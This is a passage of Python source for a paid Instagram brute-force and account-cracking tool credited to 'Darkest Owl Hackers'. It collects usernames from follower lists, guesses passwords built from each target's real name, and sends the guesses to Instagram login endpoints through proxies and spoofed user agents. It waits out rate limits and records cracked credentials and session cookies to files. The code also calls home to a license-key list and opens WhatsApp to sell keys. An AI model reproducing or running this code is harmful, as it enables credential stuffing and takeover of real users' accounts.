        elif ask in ["1","01"]:
            self.checkHasil()
        elif ask in ["2","02"]:
            self.joinGrup()
        elif ask in ["3","03"]:
            self.SettingUgent()
        elif ask in ["4","04"]:
            self.getUserAgent()
        else:
             print(f" {H}•{N} INVALID OPTION")
             time.sleep(2);self.menu()
    
    

    def checkHasil(self):
    	
        print(f"{G}TYPE [RESULTS] TO SHOW TOTAL ACCOUNT CRACKED")
        time.sleep(4)
        for i in os.listdir('results'):
            print(f' {H}•{N} {i}')
            c=input(f'{M} ENTER FILE NAME : {H}')
            g=open("results/%s"%(c)).read().splitlines()
            xx=c.split("-")
            xc=xx[0]
            print(f'\n {H}•{N} TOTAL ACCOUNTS : {H}{len(g)}{N}')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                fol=s.split("|")[2]
                ful=s.split("|")[3]
                if xc=="CP":
                  print(f"""
{P}[{K}+{P}] {K} CHECKPOINT ••{P}
 {P}|{P}
 {P}={P} username  : {K}{usr}{P}
 {P}={P} password  : {K}{pwd}{P}
 {P}={P} followers : {K}{fol}{P}
 {P}={P} following : {K}{ful}{P}
					""");time.sleep(4)
                else:
                    print(f"""
{N}[{H}+{N}] {H} SUCCESSFUL LOGIN ••{N}
 {N}|{N}
 {N}={N} username  : {H}{usr}{N}
 {N}={N} password  : {H}{pwd}{N}
 {N}={N} followers : {H}{fol}{N}
 {N}={N} following : {H}{ful}{N}
					""");time.sleep(0.05)
					
    def SettingUgent(self):
        ask = input(f"{H}•{N} DO YOUR WANT TO ADD USERAGENT [Y/N] :{H} ")
        print(f"{G} ENTER MOZILLA FIREFOX {M} AND CHROME EXTENSION")
        if ask in ask:
           uadarimu.append('uadia')
           xc = input(f"{H}•{N} ENTER USERAGENT : {H}");self.loadUgents(Instagram)
           uadia.append(xc)
           print(f"{N2}{xc}",title=f"{G} INPUTTING USERAGENT")
           open("data/UserAgent.txt", "w").write(xc)
        else:
           uadarimu.append('ugentku')
    
    def getUserAgent(self):
        try:
            with requests.Session() as ses:
                 url_iphone = ses.get("https://pastebin.com/raw/qdWeBgZc").text
                 url_huawei = ses.get("https://pastebin.com/raw/yZ7yeCtU").text
                 url_samsung = ses.get("https://pastebin.com/raw/0GuHZRhL").text
                 url_redmi = ses.get("https://pastebin.com/raw/sR4ShZHG").text
                 print(f"{G}[01]{url_iphone}")
                 print(f"{G}[02]{url_huawei}")
                 print(f"{G}[03]{url_samsung}")
                 print(f"{G}[04]{url_redmi}")
                 ugs = input(f"{H}•{N} ENTER USERAGENT : {H}")
                 open("data/UserAgent.txt", "w").write(ugs)
                 ugen = open("data/UserAgent.txt", "r").read()
                 print(f" {H}•{N} useragent added successfully...");time.sleep(3);self.menu()
        except requests.exceptions.ConnectionError:
            print(f" {H}•{N} {M} internet problem")
            time.sleep(3);exit()
    
     
    
    def search(self, link):
        try:
            xxx = self.ses.get(link, headers={"user-agent":self.ua_ig()}).json()
            for a in xxx["users"]:
                x = a["user"]
                self.id.append(x["username"]+"|"+x["full_name"])
                sys.stdout.write(f"\r{H}|{P} DUMPING.. {H}{len(self.id)}{N} USERNAME");sys.stdout.flush()
                
        except:pass

    def dump(self, uid, cok, xnx, kos):
        try:
            xxx = self.ses.get(f"https://i.instagram.com/api/v1/friendships/{uid}/{xnx}/?count=100&max_id={kos}", headers={"user-agent":self.ua_ig()}, cookies={"cookie": cok})
            for x in json.loads(xxx.text)["users"]:
                if x["username"] in self.id:
                    continue
                self.id.append(x["username"]+"|"+x["full_name"])
                sys.stdout.write(f"\r{H}|{P} DUMPING.. {H}{len(self.id)}{N} USERNAME");sys.stdout.flush()
       
            if "next_max_id" in json.loads(xxx.text):self.dump(uid, cok, xnx, json.loads(xxx.text)["next_max_id"])
        except:pass

    
    
 

    def metode(self):
        urut = []
        print(f"{G}[+]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"{G}[01] API AJAX NORMAL [BEST METHOD]")
        print(f"{G}[02] API AJAX SLOW {M}[×]")
        print(f"{G}[03] API AJAX FAST {M}[×]")
        print(f"{G}[+]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        console.print(Columns(urut))
        kons = input(f"{G}[?] CHOOSE METHOD : {H}")
        if kons in ["1","01"]:
          method.append('satu')
        elif kons in ["2","02"]:
            method.append('dua')
        elif kons in ["3","03"]:
            method.append('tiga')
        else:
            method.append('satu')
       

    def tampung(self):
        try:
            print(f"{G} ALL ACCOUNT SAVED  {G}OK{G} SAVED IN  : {G}{akunOK}{H}\n TOTAL {H}CP{H} SAVED IN : {M}{akunCP}{M}")
        except:
            pass
    
    def mulai(self):
     #   os.system('clear')
     #   logoo()     
        
        print(f"{G}TOTAL USERNAME {H}{len(self.id)}{N}")
        print(f"{G}[+] TO STOP PROCESS TYPE CTRL-Z ")
        print(f"{K}[+] ALL ACCOUNT SAVED IN  [OK.txt] [CP.txt] ")
        print(f"{G}[+] THIS TOOL NEEDS STRONG INTERNET CONNECTION")
        print(f"{G}[+]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")        
        self.metode()
        #
        self.tampung()
        #
        progRich = str(random.choice(["clock","earth","monkey","moon"]))
        global prog,des
        prog = Progress(SpinnerColumn(f'{progRich}'),TextColumn('{task.description}'))
        des = prog.add_task('', total=len(self.id))
        with prog:
            with Modol(max_workers=30) as bool:
                for user in self.id:
                    usez = user.split("|")[0]
                    nama = user.split("|")[1].lower()
                    for pasw in nama.split(" "):
                        if len(pasw)==3 or len(pasw)==4 or len(pasw)==5:
                           sandi = [pasw, pasw+"123", pasw+"1234", pasw+"12345", pasw+"123456", pasw.lower()]
                        else:
                           sandi = [pasw, pasw+"123", pasw+"1234", pasw+"12345", pasw+"123456", pasw.lower()]
                        if 'satu' in method:
                           bool.submit(self.Ngocok, usez, sandi)
                        elif 'dua' in method:
                           bool.submit(self.crackXC, usez, sandi)
                        elif 'tiga' in method:
                           bool.submit(self.crakersAPI, usez, sandi)
                        else:
                           bool.submit(self.Ngocok, usez, sandi)
            print("\r")
            print(f"{G}DARK {len(self.id)} TOTAL OK : {G}{len(self.ok)}{G} TOTAL CP : {M}{len(self.cp)}{M} ")
            time.sleep(3);exit()
  

    def UgentsLite(self):
        self.a = str(random.choice([
            'SM-J120F',
            'SM-G531M',
            'SM-G531BT',
            'SM-G531H',
            'SM-A716U1']))
        self.b = str(random.randrange(73, 99))
        self.c = str(random.randrange(4200, 4900))
        self.d = str(random.randrange(40, 150))
        useragent = f'''Mozilla/5.0 (Linux; U; Android 2.2; ru-ru; {self.a} ViewPad7 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0{self.b}.0.{self.c}.{self.d} Mobile Safari/533.1'''
        return useragent

    def ingponich(self, cok):
        try:
              link  = self.ses.get('https://www.instagram.com/api/v1/accounts/edit/web_form_data/', cookies={"cookie":cok}, headers={"user-agent":self.ua_ig()}).json()["form_data"]
              nomor = link["phone_number"].replace("-", "").replace(" ", "")
              tggl = link["birthday"]
              year, month, day = tggl.split("-")
              month = bulan_ttl[month]
              tanggal = (f"{day} {month} {year}")
        except (requests.exceptions.JSONDecodeError,KeyError):
              nomor = '-'
              tanggal_lahir = '-'
        return nomor, tanggal_lahir

    def Ingfo(self, xx):
        try:
            xnxx = self.ses.get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={xx}", headers={"user-agent":self.ua_ig(),"x-ig-app-id":'936619743392459'})
            link = xnxx.json()["data"]["user"]
            nama = link["full_name"]
            peng = link["edge_followed_by"]["count"]
            meng = link["edge_follow"]["count"]
            post = link["edge_owner_to_timeline_media"]["count"]
        except:
            peng = "-"
            meng = "-"
            post = "-"
        return peng, meng, post

    def crakersAPI(self, user, pasw):
        prog.update(des,description=f"[{H2}CRACKING{P2}]{selfi.id} [ {H2}STABILIZED{P2}] {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
        prog.advance(des)
        for password in pasw:
              try:
                    with requests.Session() as ses:
                         uaz = self.UgentsLite()
                         uklik = str(random.choice(ugentku))
                         proxy = {'http': 'socks5://'+random.choice(prox)}
                         tokenKU = ses.get('https://z-p42.www.instagram.com/accounts/login/')
                         times = calendar.timegm(current_GMT)
                         headers = {
                             "Host": "z-p42.www.instagram.com",
                             "Connection": "keep-alive",
                             "Content-Length": "312",
                             "X-IG-WWW-Claim": "0",
                             "X-Instagram-AJAX": "9080db6b6a51",
                             "Content-Type": "application/x-www-form-urlencoded",
                             "Accept": "*/*",
                             "X-Requested-With": "XMLHttpRequest",
                             "X-ASBD-ID": "198387",
                             "User-Agent": uaz,
                             "X-CSRFToken": tokenKU.cookies['csrftoken'],
                             "X-IG-App-ID": "1217981644879628",
                             "Origin": "https://z-p42.www.instagram.com",
                             "Sec-Fetch-Site": "same-origin",
                             "Sec-Fetch-Mode": "cors",
                             "Sec-Fetch-Dest": "empty",
                             "Referer": "https://z-p42.www.instagram.com/",
                             "Accept-Encoding": "gzip, deflate",
                             "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                         }
                         data = {
                             "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{times}:{password}",
                             "username":user,
                             "queryParams":"{}",
                             "optIntoOneTap":"false",
                             "stopDeletionNonce":"",
                             "trustedDeviceRecords":"{}"
                         }
                         xnxx = ses.post("https://z-p42.www.instagram.com/accounts/login/ajax/", headers = headers, data = data, proxies = proxy, allow_redirects = True)
                         if "logged_in_user" in str(xnxx.text) or "sessionid" in ses.cookies.get_dict() or "userId" in str(xnxx.text):
                              cokis = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
                              pengikut, mengikut, postingan = self.Ingfo(user)
                             # print("\r                                       ")
                              print(f"""\r{G}[+] LOGIN SUCCESSFULLY [✓]
[+]{G} USERNAME : {G}{user}{G}
[+]{G} USERNAME : {G}{user}{G}
[+]{G} PASSWORD : {G}{password}{G}
[+]{G} FOLLOWER : {G}{pengikut}{G}
[+]{G} FOLLOWING: {G}{mengikut}{G}
[+]{G} POSTS    : {G}{postingan}{G}
[+]{G} YEARS    : {G}-
[+]{G} USER-AGENT : {M}{uklik}{M}
[+]{G} COOKIE  : {G}{cokis}
					""")
                            #  adit = f'\rUsername  : {user}\nPassword  : {password}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {uklik}\nCookie    : {cokis}'
                          #    pepekXD = Panel(adit, style=f'#FFF00')
                              print('\n')
                           #   os.popen('play-audio rayok.mp3')
                             # prints(Panel(pepekXD,style='',title=f'\r{K2}••CHEKPNT••'))
                              self.ok.append(kntl)
                              with open("results/"+akunOK,"a", encoding="utf-8") as r:
                                   r.write(kntl+"\n")
                              break
                         elif "https://z-p42.www.instagram.com/challenge" in str(xnxx.text):
                              pengikut,mengikut,postingan=self.Ingfo(user)
                             # print("\r                                      ")
                              print(f"""\r{M}CHECKPOINT!!
[+]{M} USERNAME : {M}{user}{M}
[+]{M} USERNAME : {M}{user}{M}
[+]{M} PASSWORD : {M}{password}{M}
[+]{M} FOLLOWER : {M}{pengikut}{M}
[+]{M} FOLLOWING: {M}{mengikut}{M}
[+]{M} POSTS    : {K}{postingan}{M}
[+]{M} USER-AGENT : {M}{uklik}{M}
					""")
                           #   adit = f'\rUsername  : {user}\nPassword  : {password}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {uklik}'
                             # pepekXD = Panel(adit, style=f'#00FF00')
                              print('\n')
                         #     os.popen('play-audio raycp.mp3')
                             # prints(Panel(pepekXD,style='',title=f'\r{H2}LIVE••'))
                              kntl = (f"{user}|{password}|{pengikut}|{mengikut}")
                              self.ok.append(kntl)
                              with open("results/"+akunOK,"a", encoding="utf-8") as r:
                                   r.write(kntl+"\n")
                              break
                         elif "Please wait a few minutes before you try again." in xnxx.json() or "Harap tunggu beberapa menit sebelum mencoba lagi." in xnxx.json() or 'ip_block' in xnxx.text:
                              prog.update(des,description=f"[{M2} OWI-GEGE {P2}] ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                              time.sleep(15)
                              self.crakersAPI(self, user, pasw)
              except requests.exceptions.ConnectionError:
                   prog.update(des,description=f"[{M2} CRACKIN-NOT {P2}] [ {M2}STABILIZED{P2} ] {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                   time.sleep(31)
                   self.crakersAPI(self, user, pasw)
        self.lo+=1
    
    def crackXC(self, user, pasw):
        prog.update(des,description=f"[{H2} CRACKING {P2}] [ {H2}STABILIZED{P2}] {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
        prog.advance(des)
        for password in pasw:
              try:
                    with requests.Session() as ses:
                         ua = str(random.choice(ugentku))
                         get_token = ses.get('https://www.secure.instagram.com/accounts/login/?force_classic_login&hl=en')
                         android = "android-%s"%hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
                         times = calendar.timegm(current_GMT)
                         headers = {
                             "Host": "www.secure.instagram.com",
                             "Connection": "keep-alive",
                             "Content-Length": "318",
                             "X-IG-WWW-Claim": "0",
                             "X-Instagram-AJAX": "9080db6b6a51",
                             "Content-Type": "application/x-www-form-urlencoded",
                             "Accept": "*/*",
                             "X-Requested-With": "XMLHttpRequest",
                             "X-ASBD-ID": "198387$",
                             "User-Agent": ua,
                             "X-CSRFToken": get_token.cookies['csrftoken'],
                             "X-IG-App-ID": "1217981644879628",
                             "Origin": "https://www.secure.instagram.com",
                             "Sec-Fetch-Site": "same-origin",
                             "Sec-Fetch-Mode": "cors",
                             "Sec-Fetch-Dest": "empty",
                             "Referer": "https://www.secure.instagram.com/accounts/login/",
                             "Accept-Encoding": "gzip, deflate",
                             "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                         }
                         data = {
                             "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{times}:{password}",
                             "username":user,
                             "queryParams":"{}",
                             "optIntoOneTap":"false",
                             "stopDeletionNonce":"",
                             "trustedDeviceRecords":"{}"
                         }
                         xnxx = ses.post("https://www.secure.instagram.com/accounts/login/ajax/", headers = headers, data = data, allow_redirects = True)
                         if "logged_in_user" in str(xnxx.text) or "sessionid" in ses.cookies.get_dict() or "userId" in str(xnxx.text):
                              cokis = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
                              pengikut, mengikut, postingan = self.Ingfo(user)
                              print(f"""\r{G}[+] LOGIN SUCCESSFULLY [✓]
[+]{G} USERNAME : {G}{user}{G}
[+]{G} USERNAME : {G}{user}{G}
[+]{G} PASSWORD : {G}{password}{G}
[+]{G} FOLLOWER : {G}{pengikut}{G}
[+]{G} FOLLOWING: {G}{mengikut}{G}
[+]{G} POSTS    : {G}{postingan}{G}
[+]{G} YEARS    : {G}-
[+]{G} USER-AGENT : {M}{ua}{M}
[+]{G} COOKIE  : {G}{cokis}
					""")
                            #  adit = f'\rUsername  : {user}\nPassword  : {password}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {ua}\nCookie    : {cokis}'
                         #     pepekXD = Panel(adit, style=f'#00FF00')
                              print('\n')
                           #   os.popen('play-audio rayok.mp3')
                            #  prints(Panel(pepekXD,style='',title=f'\r{H2LIVE'))
                              kntl = (f"[✓] {user}|{password}|{pengikut}|{mengikut}")
                              self.ok.append(kntl)
                              with open("results/"+akunOK,"a", encoding="utf-8") as r:
                                   r.write(kntl+"\n")
                              break
                         elif "https://www.secure.instagram.com/challenge" in str(xnxx.text):
                              pengikut,mengikut,postingan=self.Ingfo(user)
                              print(f"""\r[M] CHECKPOINT!!

[+]{M} USERNAME : {M}{user}{M}
[+]{M} USERNAME : {M}{user}{M}
[+]{M} PASSWORD : {M}{password}{M}
[+]{M} FOLLOWER : {M}{pengikut}{M}
[+]{M} FOLLOWING: {M}{mengikut}{M}
[+]{M} POSTS    : {K}{postingan}{M}
[+]{M} USER-AGENT : {M}{ua}{M}
					""")
                        #      adit = f'\rUsername  : {user}\nPassword  : {password}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}\nUser-Agent: {ua}'
                          #    pepekXD = Panel(adit, style=f'#FFFF00')
                              print('\n')
                             # os.popen('play-audio raycp.mp3')
                          #    prints(Panel(pepekXD,style='',title=f'\r{K2}CHECKPOINT'))
                              self.ok.append(kntl)
                              with open("results/"+akunOK,"a", encoding="utf-8") as r:
                                   r.write(kntl+"\n")
                              break
                         elif "Please wait a few minutes before you try again." in xnxx.json() or "Harap tunggu beberapa menit sebelum mencoba lagi." in xnxx.json() or 'ip_block' in xnxx.text:
                              prog.update(des,description=f"[{M2} IGE BG {P2}] ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                              time.sleep(15)
                              self.crackXC(self, user, pasw)
              except requests.exceptions.ConnectionError:
                   prog.update(des,description=f"[{M2} CRACKIN-NOT {P2}] [ {M2}STABILIZED{P2} ] {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                   time.sleep(31)
                   self.crackXC(self, user, pasw)
        self.lo+=1

    def Ngocok(self, user, pasw):
        ses=requests.Session()
        logtemp=0
        if logtemp > 10:
            logtemp=0
        guid = str(uuid.uuid4())
        ponid=str(uuid.uuid4())
        andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
        ig_sig=iyh["ig_sig"]
        uas=self.ua_Cok()
        dat=iyh["sinkz"]
        dat.update({"id": guid})
        data1=json.dumps(dat)
        ned=hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
        data2=iyh["sinkz1"]
        data2.update({'signed_body': f'{ned}.{str(data1)}'})
        head=iyh["headaing"]
        head.update({"user-agent": uas})
        while True:
            try:
                p=ses.post(iyh["sinkz2"], headers=head, data=data2)
                break
            except:pass
        prog.update(des,description=f"[{H2} CRACKING {P2}] [ {H2}STABILIZED{P2}] {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
        prog.advance(des)
        for password in pasw:
            try:
                data=json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password":password,"login_attempt_count": str(logtemp)})
                ned=hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
                head2=iyh["headaing1"]
                head2.update({"user-agent": uas})
                sianjing=iyh["sianjing"]
                setan=sianjing.split("||")
                dataa=f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{password}{setan[7]}{logtemp}{setan[8]}'
                respon=ses.post(iyh["crack"],headers=head2,data=dataa)
                try:
                    kontol=json.loads(respon.text)
                except:
                    kontol=respon.text
                logtemp+=1
                if "logged_in_user" in str(kontol) or "sessionid" in ses.cookies.get_dict() or "userId" in str(kontol):
                    pengikut,mengikut,postingan=self.Ingfo(user)
                    print('\n')
                    print(f"""\r{G}[+] LOGIN SUCCESSFULLY [✓]
[+]{G} USERNAME : {G}{user}{G}
[+]{G} USERNAME : {G}{user}{G}
[+]{G} PASSWORD : {G}{password}{G}
[+]{G} FOLLOWER : {G}{pengikut}{G}
[+]{G} FOLLOWING: {G}{mengikut}{G}
[+]{G} POSTS    : {G}{postingan}{G}
[+]{G} YEARS    : {G}-
[+]{G} USER-AGENT : {M}-
[+]{G} COOKIE  : {G}-
					""")
               #     adit = f'\rUsername  : {user}\nPssword  : {password}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}'
               #     pepekXD = Panel(adit, style=f'#00F00')
                #    os.popen('play-audio rayok.mp3')
                    print('\n')
                    #prints(Panel(pepekXD,style='',tite=f'\r{H2}LIVE'))
                    kntl = (f"[✓] {user}|{password}|{pengikut}|{mengikut}")
                    self.ok.append(kntl)
                    with open("results/"+akunOK,"a", encoding="utf-8") as r:
                         r.write(kntl+"\n")
                    break
                elif "https://i.instagram.com/challenge" in str(respon.text):
                    pengikut,mengikut,postingan=self.Ingfo(user)                  
                    print('\n')
                    print(f"""\r{M}CHECKPOINT!!
[+]{M} USERNAME : {M}{user}{M}
[+]{M} USERNAME : {M}{user}{M}
[+]{M} PASSWORD : {M}{password}{M}
[+]{M} FOLLOWER : {M}{pengikut}{M}
[+]{M} FOLLOWING: {M}{mengikut}{M}
[+]{M} POSTS    : {K}{postingan}{M}
[+]{M} USER-AGENT : {M}-
					""")
              #      adit = f'\rUsername  : {user}\nPassword  : {password}\nPengikut  : {pengikut}\nMengikuti : {mengikut}\nPostingan : {postingan}'
               #     pepekXD = Panel(adit, style=f'#FFFF00')
                    print('\n')
             #       os.popen('play-audio raycp.mp3')
              #      prints(Panel(pepekD,style='',title=f'\r{K2}CHECKPOINT'))
                    kntl = (f"[X️] {user}|{password}|{pengikut}|{mengikut}")
                    self.cp.append(kntl)
                    with open("results/"+akunCP,"a", encoding="utf-8") as r:
                         r.write(kntl+"\n")
                    break
                elif "ip_block" in str(respon.text) or "spam" in str(respon.text):
                    prog.update(des,description=f"IG V1 ( {M2}IP-SPA{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                    time.sleep(15)
            except requests.exceptions.ConnectionError:
                prog.update(des,description=f"[{M2} CRACKIN-NOT {P2}] [ {M2}STABILIZED{P2} ] {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                prog.advance(des)
                time.sleep(31)
            #except Exception as e:prints(e)
        self.lo+=1
        
#####
def logoku():
	print(f""" 
 \033[1;32m ::::::::   ::::::::  ::::    ::: 
\033[1;32m :+:    :+: :+:    :+: :+:+:   :+: 
\033[1;97m +:+        +:+        :+:+:+  +:+ 
\033[1;97m +#++:++#++ +#++:++#++ +#+ +:+ +#+ 
\033[1;97m        +#+        +#+ +#+  +#+#+# 
\033[1;32m #+#    #+# #+#    #+# #+#   #+#+# 
\033[1;32m  ########   ########  ###    #### 

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\33[1;30m[]\33[mNAME   | \33[1;32mINSTSGRAM MULTI BRUTEFORCE CLONER
\33[1;30m[]\33[mTEAM   | \33[1;32mDARKEST OWL HACKERS 
\33[1;30m[]\33[mOWNER  | \33[1;32m[MICHAEL],,,[SHALOM],,,[OMOTOSHO]
\33[1;30m[]\33[mGMAIL    | \33[1;32mDARKIEST OWL HACKERS@PROTON.ME
\33[1;30m[]\33[mSTATUS | \33[1;32mPAID
\33[1;30m[]\33[mGITHUB | \33[1;33mDARKIEST OWL HACKERS
\33[1;30m[]\33[mWHATSAPP | \33[1;32m+234---
\33[1;30m[]\33[mFACEBOOK | \33[1;32m[MICHAEL],[SHALOM],[OMOTOSHO]
\33[1;30m[]\33[mVERSION  | \33[1;34m1.0
\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
balpakna =("""\033[1;32mm---------------------------------------------------""")    
meyermarexudi =("""\033[1;32m---------------------------------------------------""")    
alltimexudi =("""\33[1;32mHELLO THIS TOOL IS PAID""")
xudartimenai =("""\033[1;92mTO BUY THIS TOOL CONTACT ADMIN""")
fuckyoursali =("""\33[1;32mYOUR KEY HAS BEEN APPROVED CONGRATULATIONS """)
xudinaministar =("""\33[1;32mFUCK YOUR BYPASS SYSTEM... """)
time.sleep(3)
hedaborakarent =("""\33[1;32mIF YOU TRY TO BYPASS YOUR DATA WILL BE FUCKED""")
time.sleep(3)
#____APPROVAL SYSTEM ADD_____#
def meyexudi():
  os.system('clear')
  logoku()
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/DarkestOwlHackers/Ig-mbf1/blob/main/Xhhobf.txt').text
    if id in httpCaht:
      print(fuckyoursali)
      print(hedaborakarent)
      msg = str(os.geteuid())
      #time.sleep(0.5)
      print()
      pass
    else:
      print(meyermarexudi)
      print("\033[1;92mYOUR KEY : "+id)
      print(meyermarexudi)
      print(xudinaministar)
      print(meyermarexudi)
      print(alltimexudi)
      print(meyermarexudi)
      print(xudartimenai)
      print(meyermarexudi)
      input('\33[1;32mIF U WANT TO BUY THEN PRESS ENTER IN YOUR TERMINAL ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20key%20The%20key%20is%20:%20'+id);os.system('am start https://wa.me/+2349130154748?text='+tks),approval()
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
def naima():
	print('-------------------')
if __name__=='__main__':
	         os.system("git pull")
	         Instagram()
	
